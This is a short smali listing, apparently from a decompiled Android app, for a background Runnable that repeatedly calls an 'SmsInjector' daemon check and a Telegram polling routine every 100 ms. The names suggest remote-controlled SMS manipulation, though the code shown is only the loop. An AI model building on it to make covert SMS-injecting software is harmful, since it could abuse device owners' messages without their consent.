.class Lcom/astik/module/TelegramPollingService$6;
.super Ljava/lang/Object;
.source "TelegramPollingService.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/astik/module/TelegramPollingService;->startPollThread()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/astik/module/TelegramPollingService;


# direct methods
.method constructor <init>(Lcom/astik/module/TelegramPollingService;)V
    .locals 0
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x8010
        }
        names = {
            null
        }
    .end annotation

    .line 448
    iput-object p1, p0, Lcom/astik/module/TelegramPollingService$6;->this$0:Lcom/astik/module/TelegramPollingService;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    iget-object v0, p0, Lcom/astik/module/TelegramPollingService$6;->this$0:Lcom/astik/module/TelegramPollingService;

    invoke-static {v0}, Lcom/astik/module/SmsInjector;->ensureDaemon(Landroid/content/Context;)Z

    .line 451
    :goto_0
    iget-object v0, p0, Lcom/astik/module/TelegramPollingService$6;->this$0:Lcom/astik/module/TelegramPollingService;

    invoke-static {v0}, Lcom/astik/module/TelegramPollingService;->access$900(Lcom/astik/module/TelegramPollingService;)Z

    move-result v0

    if-nez v0, :cond_0

    iget-object v0, p0, Lcom/astik/module/TelegramPollingService$6;->this$0:Lcom/astik/module/TelegramPollingService;

    invoke-static {v0}, Lcom/astik/module/TelegramPollingService;->access$000(Lcom/astik/module/TelegramPollingService;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-wide/16 v0, 0x64

    .line 452
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1

    .line 453
    :try_start_1
    iget-object v0, p0, Lcom/astik/module/TelegramPollingService$6;->this$0:Lcom/astik/module/TelegramPollingService;

    invoke-static {v0}, Lcom/astik/module/SmsInjector;->ensureDaemon(Landroid/content/Context;)Z

    invoke-static {v0}, Lcom/astik/module/TelegramPollingService;->access$1000(Lcom/astik/module/TelegramPollingService;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    nop

    goto :goto_0

    :catch_1
    :cond_0
    return-void
.end method
